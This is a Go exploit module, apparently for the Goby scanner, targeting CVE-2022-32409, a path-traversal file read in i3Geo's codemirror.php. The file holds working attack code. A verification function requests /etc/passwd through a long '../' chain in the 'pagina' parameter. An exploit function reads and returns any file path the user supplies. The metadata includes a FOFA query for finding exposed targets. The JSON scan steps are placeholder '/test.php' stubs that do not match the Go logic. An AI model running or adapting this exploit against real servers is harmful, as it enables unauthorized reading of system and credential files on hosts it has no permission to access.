package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "I3Geo codemirror.php file pagina parameter file read vulnerability (CVE-2022-32409)",
    "Description": "<p>I3geo is an open source application of salade situacao for developing interactive network maps.</p><p>I3Geo has a file reading vulnerability, through which an attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely insecure state.</p>",
    "Product": "i3geo",
    "Homepage": "https://softwarepublico.gov.br/social/i3geo",
    "DisclosureDate": "2022-12-22",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "body=\"i3geo\"",
    "GobyQuery": "body=\"i3geo\"",
    "Level": "3",
    "Impact": "<p>I3Geo has a file reading vulnerability, through which an attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely insecure state.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://softwarepublico.gov.br/social/i3geo\">https://softwarepublico.gov.br/social/i3geo</a></p>",
    "References": [
        "https://softwarepublico.gov.br/social/i3geo"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2022-32409"
    ],
    "CNNVD": [
        "CNNVD-202207-1334"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.6",
    "Translation": {
        "CN": {
            "Name": "i3Geo codemirror.php 文件 pagina 参数文件读取漏洞（CVE-2022-32409）",
            "Product": "i3geo",
            "Description": "<p>i3geo是saladesituacao开源的一个用于开发交互式网络地图的应用程序。</p><p>i3Geo存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://softwarepublico.gov.br/social/i3geo\" target=\"_blank\">https://softwarepublico.gov.br/social/i3geo</a><br></p>",
            "Impact": "<p>i3Geo存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "I3Geo codemirror.php file pagina parameter file read vulnerability (CVE-2022-32409)",
            "Product": "i3geo",
            "Description": "<p>I3geo is an open source application of salade situacao for developing interactive network maps.</p><p>I3Geo has a file reading vulnerability, through which an attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely insecure state.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://softwarepublico.gov.br/social/i3geo\" target=\"_blank\">https://softwarepublico.gov.br/social/i3geo</a><br><br></p>",
            "Impact": "<p>I3Geo has a file reading vulnerability, through which an attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely insecure state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10781"
}`


	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			uri_1 := "/i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd"
			cfg_1 := httpclient.NewGetRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			if resp_1, err := httpclient.DoHttpRequest(hostinfo, cfg_1); err == nil {
				if resp_1.StatusCode == 200 && strings.Contains(resp_1.Utf8Html, "root:") && strings.Contains(resp_1.Utf8Html, ":0:0") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filepath := ss.Params["filepath"].(string)
			uri_1 := "/i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../.." + filepath
			cfg_1 := httpclient.NewGetRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			if resp_1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
				if resp_1.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp_1.Utf8Html
				}
			}
			return expResult
		},
	))
}
